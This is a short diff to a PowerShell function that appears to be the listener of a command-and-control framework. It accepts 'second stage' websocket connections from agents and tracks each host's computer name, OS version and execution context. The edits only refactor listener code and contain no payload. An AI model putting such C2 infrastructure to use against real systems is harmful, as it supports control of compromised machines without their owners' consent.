@@ -34,10 +34,12 @@ Function Global:New-Listerner()
 	}
 
 	# Build a simple TCP listerner
-	[console]::Title = ("Server: $LHOST : $LPORT")
-	$endpoint        = new-object System.Net.IPEndPoint ($LHOST, $LPORT)
-	$listener        = new-object System.Net.Sockets.TcpListener $endpoint
-	$listener.start()
+	<#
+		[console]::Title = ("Server: $LHOST : $LPORT")
+		$endpoint        = new-object System.Net.IPEndPoint ($LHOST, $LPORT)
+		$listener        = new-object System.Net.Sockets.TcpListener $endpoint
+		$listener.start()
+	#>
 
 	# Create a template listerner object
 	$obj = [pscustomobject]@{
@@ -70,7 +72,8 @@ Function Global:New-Listerner()
 			# handle websocket (second stage)
 			write-host "Agent connection: $($context.Request.UserHostAddress)  =>  $($context.Request.Url)" -f 'mag'
 
-			[System.Net.WebSockets.WebSocket]  $ws = $context.AcceptWebSocketAsync()
+			$ws = $context.AcceptWebSocketAsync()
+			
 			
 			$Agent = [PSCustomObject]@{
 					# required information
@@ -81,7 +84,7 @@ Function Global:New-Listerner()
 					# information enumerated
 					ComputerName     = [String]""
 					OSVersion        = [String]""
-					LastSeen         = [String](get-date)
+					LastSeen         = [String](get-date) 
 					ExecutionPath    = [String]""
 					ExecutionContext = [String]""
 					
@@ -116,7 +119,7 @@ Function Global:New-Listerner()
 	}
 
 
-	$listener.Stop();
+	$http.Stop();
 
 	
 
